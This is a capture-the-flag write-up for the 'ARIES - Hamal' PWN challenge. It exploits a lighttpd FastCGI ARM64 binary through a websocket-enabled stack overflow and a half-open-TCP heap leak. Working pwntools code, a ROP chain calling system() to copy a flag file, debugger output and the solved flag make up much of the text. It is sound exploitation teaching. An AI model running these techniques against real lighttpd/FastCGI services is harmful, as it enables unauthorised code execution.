Author: 0x6fe1be2
Version: 03-11-2025

# ARIES - Hamal

Status: Solved

Category: PWN

Points: 370 (2 Solves)

Description:

> Experience our next-generation web interface: HAMAL.
> 
> HAMAL (High-Availability Monitoring and Logistics) provides an intuitive dashboard for monitoring and managing your entire space infrastructure. Get real-time insights into your satellite fleet and ground stations with a clean, responsive interface designed for 
> mission-critical operations.
> 
> Access your space operations from anywhere, anytime - all through your web browser.


## TL;DR 

Hamal is the first stage of the ARIES challenge. It requires exploiting a fastcgi ARM64 binary behind a lighttpd server. It makes use of the new websocket feature that allows full duplex connections to the fastcgi binary. This allows us two important exploit vectors:

1. half open TCP connections to get memory leaks (through websocket echo pings)
2. sending data even if `CONTENT_LENGTH` isn't set (allowing us to get a BOF in the `/api/boost` api)

We can combine both to build a ROP Chain and get RCE and the flag.

## Files

We are given the following files

```  
hamal/
├── Dockerfile
├── docker-compose.yml
├── share
│   ├── hamal
│   ├── lighttpd.conf
│   └── static
│       └── ...
└── src
    └── hamal.c
```

Lets go over the most important ones:

The *Dockerfile* tells us that we need to deal with a lighttpd server and that the flag is stored in */dev/flag*.

[*Dockerfile*](https://gfelber.dev/writeups/res/hamal/Dockerfile)


The *lighttpd.conf* shows us that there is a fastcgi binary accepting requests through the `/api` endpoint and four process run in parallel `"min-procs" => 4`. Also websockets are enabled `"upgrade" => "enable"`.

[*lighttpd.conf*](https://gfelber.dev/writeups/res/hamal/lighttpd.conf)

Looking at the binary we see that the entire service is actually run in ARM64.
```  
Arch:       aarch64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        PIE enabled
Stripped:   No
Comment:    GCC: (Debian 14.2.0-19) 14.2.0
```

And last but not least we have the source code in *hamal.c*.

[*hamal.c*](https://gfelber.dev/writeups/res/hamal/hamal.c)


### Websockets
Before going into websockets we first need to understand how fastcgi connections usually work with lighttp. Notably how client requests are send to the binary:

```                         
  ┌─────────────────┐    
  │      Client     │    
  └─────────────────┘    
   1.│            ▲      
     │            │      
     ▼          4.│      
  ┌─────────────────┐    
  │     Lighttpd    │    
  └─────────────────┘    
   2.│            ▲      
     │            │      
     ▼          3.│      
  ┌─────────────────┐    
  │     FastCGI     │    
  └─────────────────┘    
                         
```
1. Send a request to the Lighttpd server
2. buffer the entire request and send it to the FastCGI binary
3. Send the response to the Lighttpd server
4. buffer the entire response and send it back to the client

This is mainly done so accurate values can be set in e.g. `CONTENT_LENGTH` even if streaming transfer encodings like `chunked` are used.

As preluded to earlier our service uses websockets, notable because we enabled it in the configuration through ``"upgrade" => "enable"``, but also because we send the correct handshake through the `ws_upgrade()` function.

```c
    char *upgrade = get_env("HTTP_UPGRADE");

    if (strcmp(upgrade, "websocket") == 0) {
      if (!ws_upgrade()) {
        FCGI_Finish();
        continue;
      }
    }
```

This changes the flow the following way:
```
  ┌─────────────────┐    
  │      Client     │    
  └─────────────────┘    
   1.│    ▲    5.│▲      
     │    │      ││      
     ▼  4.│      ││      
  ┌──────────────┼┼─┐    
  │     Lighttpd ││ │    
  └──────────────┼┼─┘    
   2.│    ▲      ││      
     │    │      ││      
     ▼  3.│      ▼│      
  ┌─────────────────┐    
  │     FastCGI     │    
  └─────────────────┘    
```
1. Request a upgrading to websocket
2. forward to binary
3. respond with upgrading to websocket
4. forward to client
5. Full Duplex connection to binary from client

So instead of carefully buffering every request we now have a full duplex connection to the client. If this happens it messes with some guarantees that are usually expected from FastCGI. Notably it is possible to receive data even if `CONTENT_LENGTH` isn't set. So how can we exploit this?

## Vulnerabilities
The first vulnerability should seems obvious. We upgrade every client that requests it to a websocket. This is a problem because our `/api/boost` endpoint allocates a buffer on stack using the `CONTENT_LENGTH` environment variable and `gets()` it. Even though suboptimal this function would usually be safe, because you can't receive more data than `CONTENT_LENGTH`. But because we upgraded to websockets we lost this guarantee.

Fun Fact: the FastCGI library made the decision to write and port their on version of `gets()`, which behaves the same way ([source](https://github.com/FastCGI-Archives/fcgi2/blob/2.4.2/libfcgi/fcgi_stdio.c#L488)). 

Note: actually there is another vulnerability, notable there is a one null byte BOF due to `gets()`, but that shouldn't be enough for exploitation.

```c
static void handle_signal_boost(void) {
  int content_length = atoi(get_env("CONTENT_LENGTH"));
  char content[content_length];

  gets(content);

  if (strstr(content, "enable")) {
    sheratan_push(shfd, BOOST_ENABLE);
    send_text("Signal boost ENABLED - Power increased by +5dBm");
  } else if (strstr(content, "disable")) {
    sheratan_push(shfd, BOOST_DISABLE);
    send_text("Signal boost DISABLED - Power restored to normal");
  } else {
    send_response("text/plain", 400, "Invalid signal boost command\n");
  }
}
```

So this would allow us to write a ROP chain, but we still need to break ASLR somehow ... so how do we do that?

### Half-Open Connections
Because we now make use of a full duplex connections we have access to a powerful TCP primitive half-open (al. half-closed) and make into into a simplex connection. So how is this useful?

If we look at the following code snippet inside `ws_recv()` we see that we allocate a heap chunk using the websocket frame length (without clearing) then receive data from the client. So what would happens if `fread()` terminates without reading all the data? It leaves the memory region uninitialised.

Also if we specify the opcode `PING` or `PONG` our frame is just echoed back.

```c
  frame->data = malloc(frame->length);
  if (frame->length > 0) {
    fread(frame->data, 1, frame->length, stdin);

    if (mask_bit)
      for (size_t i = 0; i < frame->length; i++)
        frame->data[i] ^= masking_key[i % 4];
  }
```

Everyone familiar with heap exploitation knows that this is a prime target to get memory leaks and defeat ASLR for the libc and heap memory regions (e.g. through leaking the linked list pointers of large bins). So how do we make `fread()` terminate early?

TCP allows us to only close the writing end of a socket using the `shutdown(SHUT_WR)` syscall (`t.shutdown('send')` in pwntools) and turning it into a simplex connection. This means `fread()` will terminate early as it reaches an EOF and terminate allowing us to leak memory.


Note: Half-Open connections aren't supported by SSL, so one way to prevent such an attack on other services would be to use SSL.


## Exploitation
So now that we know the vulnerabilities how do we properly chain and exploit them? First let's define some helper functions that allow us to do HTTP requests through pwntools:

Note: i use a bunch of aliases, a full list can be found [here](https://gist.github.com/gfelber/e213e0822b8c96da701fd39c8784e1c2)


```python
def build_header(path, method, data=None, cookie=None, data_len=None, headers=None):
  if headers is None:
    headers = list()

  if data and data_len is None:
    data_len = len(data)

  if data_len is not None:
    headers += [f'Content-Length: {data_len}\r\n'.encode()]

  if cookie is not None:
    headers += [f'Cookie: {cookie}\r\n'.encode()]

  return flat(
      byt(method), b' ', byt(path), b' HTTP/1.1\r\n',
      b'Host: ', f'{IP}:{PORT}\r\n'.encode(),
      headers,
      b'\r\n'
    )

def build_upgrade_header(path, method, data=None, data_len=None):
  headers = [
    b'Upgrade: websocket\r\n',
    b'Connection: Upgrade\r\n',
    b'Sec-WebSocket-Version: 111\r\n',
    f'Sec-WebSocket-Key: {b64e(p64(0x6fe1be2))}\r\n'.encode(),
  ]
  return build_header(path, method, data=data, data_len=data_len, headers=headers)  

```


We also need some helpers for interacting with the websocket, as even though they are TCP they receive and send websocket frames:

```python 
def ws_send(data, opcode=1, fin=True, masking_key=False):
    if 0x3 <= opcode <= 0x7 or 0xB <= opcode:
        raise ValueError('Invalid opcode')
    header = struct.pack('!B', ((bool(fin) << 7) | opcode))
    mask_bit = (1 << 7) if masking_key else 0
    length = len(data)
    if length < 126:
        header += struct.pack('!B', (mask_bit|length))
    elif length < (1 << 16):
        header += struct.pack('!B', (mask_bit|126)) + struct.pack('!H', length)
    elif length < (1 << 63):
        header += struct.pack('!B', (mask_bit|127)) + struct.pack('!Q', length)
    else:
        raise ValueError('Data too large')

    if mask_bit:
        # mask data
        header += masking_key
        data = bytearray(data)
        for i in range(0, length):
            data[i] ^= masking_key[i % 4]

    return header + data

def ws_recv(t=None):
    first_byte = rcv(1, t)
    second_byte = rcv(1, t)

    fin = (first_byte[0] >> 7) & 1
    opcode = first_byte[0] & 0x0F
    mask = (second_byte[0] >> 7) & 1
    payload_length = second_byte[0] & 0x7F

    if payload_length == 126:
        payload_length = struct.unpack('!H', rcv(2, t))[0]
    elif payload_length == 127:
        payload_length = struct.unpack('!Q', rcv(8, t))[0]

    masking_key = b''
    if mask:
        masking_key = rcv(4, t)

    payload_data = rcv(payload_length, t)

    if mask:
        payload_data = bytearray(payload_data)
        for i in range(payload_length):
            payload_data[i] ^= masking_key[i % 4]
        payload_data = bytes(payload_data)

    return fin, opcode, payload_data
```

And this enables us to write our first simple PoC, causing a segfault using the BOF:
```
t = get_target()
se(build_upgrade_header(BOOST, 'GET'))
ru('\r\n\r\n')
se(cyc(0x60) + b'\n')
```

and we get a lot of control
```
(gdb) i reg
...
x18            0x0                 0
x19            0x6161616661616165  7016996786768273765
x20            0x6161616861616167  7016996795358208359
x21            0x6161616a61616169  7016996803948142953
x22            0x6161616c6161616b  7016996812538077547
x23            0x6161616e6161616d  7016996821128012141
x24            0x616161706161616f  7016996829717946735
x25            0x6161617261616171  7016996838307881329
x26            0x6161617461616173  7016996846897815923
x27            0x6161617661616175  7016996855487750517
x28            0x0                 0
x29            0x6161616261616161  7016996769588404577
x30            0x6161616461616163  7016996778178339171
sp             0xffffe573b730      0xffffe573b730
pc             0x61616461616163    0x61616461616163
cpsr           0x60001000          [ EL=0 BTYPE=0 SSBS C Z ]
fpsr           0x0                 [ ]
fpcr           0x0                 [ Len=0 Stride=0 RMode=0 ]
tpidr          0xffff9f0a2740      0xffff9f0a2740
tpidr2         0x0                 0x0
```

Note: i had some issues in my debug setup with [pwndbg](https://github.com/pwndbg/pwndbg) so i fell back to plain gdb, which is more than enough for a simple ROP chain.

So next lets write a PoC for getting a leak. Our plan is to create a large bin and outside tcache-range so we allocate `0x410`, which gets freed. 


```python
t = get_target()
se(build_upgrade_header(STATUS, 'GET'))
ru('\r\n\r\n')

data = ws_send(cyc(0x410), opcode=9) # PING opcode
se(data)
ws_recv()  
# remove the data to keep heap chunk uninitialized
se(data[:-0x410])
# shutdown writing end of duplex connection
t.shutdown('send')
# receive our leak
_, _, leak = ws_recv()

linfo(f'leak:\n%s', hexdump(leak))
cl(t)
```

If we now reallocate into the same memory region while closing the writing end of the socket, we successfully leak heap (`0xaaaa...`) and libc (`0xffff...`) addresses:

```
[*] leak:                                                                                                                                                                                                                              
    00000000  10 10 97 9e  ff ff 00 00  10 10 97 9e  ff ff 00 00  │····│····│····│····│                                                                                                                                                
    00000010  20 1f 22 f8  aa aa 00 00  20 1f 22 f8  aa aa 00 00  │ ·"·│····│ ·"·│····│                                                                                                                                                
    00000020  69 61 61 61  6a 61 61 61  6b 61 61 61  6c 61 61 61  │iaaa│jaaa│kaaa│laaa│                                                                                                                                                
    00000030  6d 61 61 61  6e 61 61 61  6f 61 61 61  70 61 61 61  │maaa│naaa│oaaa│paaa│                                                                                                                                                
    00000040  71 61 61 61  72 61 61 61  73 61 61 61  74 61 61 61  │qaaa│raaa│saaa│taaa│                                                                                                                                                
```

removing the fixed offset from the address we get the start of the memory region
```python
libc.address = u64(leak[0x00:0x08]) - 0x1b1010
HEAP = u64(leak[0x10:0x18]) - 0x35f20
```

Note: a longer hostname e.g. `127.000.00.1:8080` will take up more heap memory than `127.0.0.1:8080` slightly changing the offset.

Now we just have to write our ROP Chain, because we have a lot of control over registers and a HEAP leak it is rather straight forward to find gadgets:

```python
# hide a command on the heap on a known address due to leak
flag_name = randoms(0x10)
CMD = f"cp /dev/flag /var/www/html/{flag_name}"

payload = flat({
  'qaab': CMD.encode() + b'\0'
}, length=0x410)

data = ws_send(payload, opcode=9)

# continue to get leak

t = get_target()
# mov x0, x25 ; blr x20
SETUP = libc.address + 0x11dc38

bof = flat({
  0: b'\0',
  'caaa': SETUP,
  'gaaa': libc.sym.system, # x20 
  'qaaa': HEAP + 0x700, # x25
  'baab': libc.address + 0x1b1c00, # prevent segfault
  0x200: b''
})

se(build_upgrade_header(BOOST, 'GET'))
ru('\r\n\r\n')
se(bof + b'\n')
sleep(1)
cl()
```

But for some reason this didn't work and we actually seem to have gotten an invalid address? This is where `"min-procs" => 4` comes back to haunt us. Our leak is from a different process as the one we send the ROP chain to, so how can we guarantee we get the same process?

Well it is rather straightforward we can just open multiple connections and keep them open so we always get the same last remaining process when connecting.
```python
# lock all but on process
tl = list()
for i in range(3): 
  tl.append(get_target())
  se(build_upgrade_header(STATUS, 'GET'), tl[-1])

```


This time it worked and all we have left to do is to get the flag from the web server:
```python
t = get_target()
se(build_header(f'/{flag_name}', 'GET'))
it()
```


## Final

[*exploit.py*](https://gfelber.dev/writeups/res/hamal/exploit.py)

Flag: `space{th3re_1s_4_r34s0n_1ts_c4ll3d_bl3dd1ng_ed63_6e04d1e31e3154f0}`
